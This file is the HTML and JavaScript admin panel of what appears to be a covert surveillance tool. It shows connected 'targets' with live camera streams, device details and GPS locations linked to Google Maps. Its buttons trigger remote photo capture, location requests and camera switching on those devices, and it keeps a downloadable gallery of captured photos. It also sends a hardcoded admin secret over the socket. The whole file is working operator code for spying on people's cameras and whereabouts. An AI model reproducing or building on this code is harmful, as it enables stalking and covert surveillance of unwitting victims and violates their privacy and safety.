<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard - Live Monitoring</title>
    <style>
        * { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background: #121212;
            color: #eee;
        }
        header {
            background: #1e1e1e;
            padding: 15px 25px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #333;
        }
        h1, h2 { margin: 0; color: #fff; }
        h1 { font-size: 20px; }
        h2 { font-size: 18px; margin-bottom: 15px; }
        .controls button {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 6px;
            cursor: pointer;
            font-weight: bold;
        }
        .container {
            padding: 20px;
            max-width: 1200px;
            margin: auto;
        }
        .login-box {
            width: 100%;
            max-width: 350px;
            background: #1e1e1e;
            padding: 30px;
            border-radius: 10px;
            margin: 100px auto;
            text-align: center;
            border: 1px solid #333;
        }
        .login-box input {
            width: 100%;
            padding: 10px;
            margin: 15px 0;
            background: #2c2c2c;
            border: 1px solid #444;
            color: #fff;
            border-radius: 6px;
        }
        .login-box button {
            width: 100%;
            background: #27ae60;
            color: white;
            border: none;
            padding: 10px;
            border-radius: 6px;
            font-weight: bold;
            cursor: pointer;
        }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .card {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 10px;
            padding: 15px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.4);
        }
        .card img {
            width: 100%;
            height: 200px;
            object-fit: cover;
            border-radius: 6px;
            background: #000;
        }
        .card-info { margin-top: 10px; font-size: 13px; color: #ccc; }
        .card-actions {
            margin-top: 12px;
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        .btn {
            padding: 6px 12px;
            border: none;
            border-radius: 5px;
            font-size: 12px;
            font-weight: bold;
            cursor: pointer;
            color: white;
        }
        .btn-capture { background: #3498db; }
        .btn-location { background: #27ae60; }
        .btn-switch { background: #9b59b6; }
        .btn-danger { background: #e74c3c; }
        .btn:hover { opacity: 0.85; }
        .maps-link {
            display: inline-block;
            margin-top: 5px;
            color: #3498db;
            text-decoration: underline;
            font-weight: bold;
        }
        .section-divider {
            border: 0;
            height: 1px;
            background: #333;
            margin: 30px 0;
        }
        .photos-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
            gap: 15px;
        }
        .photo-card {
            background: #1e1e1e;
            border: 1px solid #333;
            border-radius: 8px;
            padding: 10px;
            text-align: center;
        }
        .photo-card img {
            width: 100%;
            height: 140px;
            object-fit: cover;
            border-radius: 4px;
        }
    </style>
</head>
<body>

<div id="loginScreen" class="login-box">
    <h2>Admin Login</h2>
    <input type="password" id="passwordInput" placeholder="Enter password">
    <button onclick="login()">Login</button>
</div>

<div id="dashboardScreen" style="display: none;">
    <header>
        <h1>Admin Control Panel</h1>
        <div class="controls">
            <button onclick="logout()">Logout</button>
        </div>
    </header>
    <div class="container">
        <h2>Active Live Targets</h2>
        <div id="targetsGrid" class="grid">
            <p style="color: #777;">No active targets connected.</p>
        </div>

        <hr class="section-divider">

        <h2>Captured Gallery / Photos</h2>
        <div id="photosGrid" class="photos-grid">
            <p style="color: #777;">No photos captured yet.</p>
        </div>
    </div>
</div>

<script src="/socket.io/socket.io.js"></script>
<script>
let socket = null;
const targetsGrid = document.getElementById("targetsGrid");
const photosGrid = document.getElementById("photosGrid");
const loginScreen = document.getElementById("loginScreen");
const dashboardScreen = document.getElementById("dashboardScreen");

let allPhotos = [];
let activeUsers = {};

async function checkStatus() {
    try {
        const res = await fetch("/api/admin/status");
        const data = await res.json();
        if (data.authenticated) {
            initSocket();
        }
    } catch (e) {}
}
checkStatus();

async function login() {
    const password = document.getElementById("passwordInput").value;
    try {
        const res = await fetch("/api/admin/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ password })
        });
        const data = await res.json();
        if (data.ok) {
            initSocket();
        } else {
            alert("Wrong password!");
        }
    } catch (e) {
        alert("Login failed.");
    }
}

async function logout() {
    await fetch("/api/admin/logout", { method: "POST" });
    window.location.reload();
}

function initSocket() {
    loginScreen.style.display = "none";
    dashboardScreen.style.display = "block";

    socket = io();
    socket.emit("admin-auth", "ayaz;;");

    socket.on("admin-initial-state", (data) => {
        activeUsers = data.users || {};
        allPhotos = data.photos || [];
        renderTargets(activeUsers);
        renderPhotos(allPhotos);
    });

    socket.on("update-users-list", (users) => {
        activeUsers = users;
        renderTargets(users);
    });

    socket.on("update-live-stream", (data) => {
        const img = document.getElementById(`stream-${data.socketId}`);
        if (img) {
            img.src = data.frameData;
        }
    });

    socket.on("new-photo", (photo) => {
        allPhotos.unshift(photo);
        renderPhotos(allPhotos);
    });

    socket.on("photo-deleted", (photoId) => {
        allPhotos = allPhotos.filter(p => p.id !== photoId);
        renderPhotos(allPhotos);
    });
}

function renderTargets(users) {
    const keys = Object.keys(users);
    if (keys.length === 0) {
        targetsGrid.innerHTML = `<p style="color: #777;">No active targets connected.</p>`;
        return;
    }

    let html = "";
    keys.forEach(id => {
        const target = users[id];
        let locationText = "Location: Not requested yet";
        
        if (target.location) {
            const lat = target.location.latitude;
            const lng = target.location.longitude;
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
            locationText = `📍 Lat: ${lat}, Lng: ${lng}<br><a class="maps-link" href="${mapsUrl}" target="_blank">🗺️ Open in Google Maps</a>`;
        }

        html += `
            <div class="card">
                <img id="stream-${target.id}" src="" alt="Live Stream">
                <div class="card-info">
                    <strong>${target.deviceInfo}</strong><br>
                    <span style="color: #888; font-size: 11px;">ID: ${target.id}</span><br>
                    <div style="margin-top: 6px;">${locationText}</div>
                </div>
                <div class="card-actions">
                    <button class="btn btn-capture" onclick="capturePhoto('${target.id}')">Capture</button>
                    <button class="btn btn-location" onclick="requestLocation('${target.id}')">Location</button>
                    <button class="btn btn-switch" onclick="switchCamera('${target.id}')">Switch Cam</button>
                </div>
            </div>
        `;
    });
    targetsGrid.innerHTML = html;
}

function renderPhotos(photos) {
    if (!photos || photos.length === 0) {
        photosGrid.innerHTML = `<p style="color: #777;">No photos captured yet.</p>`;
        return;
    }

    let html = "";
    photos.forEach(photo => {
        html += `
            <div class="photo-card">
                <img src="${photo.imageData}" alt="Captured Photo">
                <div style="font-size: 11px; color: #aaa; margin: 6px 0;">${photo.deviceInfo}</div>
                <div style="display: flex; gap: 5px; justify-content: center;">
                    <a href="/api/admin/photos/${photo.id}/download" class="btn btn-capture" style="text-decoration: none; font-size: 10px;">Download</a>
                    <button class="btn btn-danger" style="font-size: 10px;" onclick="deletePhoto('${photo.id}')">Delete</button>
                </div>
            </div>
        `;
    });
    photosGrid.innerHTML = html;
}

function capturePhoto(id) {
    socket.emit("admin-trigger-capture", id);
}

function requestLocation(id) {
    socket.emit("admin-request-location", id);
}

function switchCamera(id) {
    socket.emit("admin-switch-camera", id);
}

async function deletePhoto(id) {
    try {
        await fetch(`/api/admin/photos/${id}`, { method: "DELETE" });
    } catch (e) {}
}
</script>
</body>
</html>
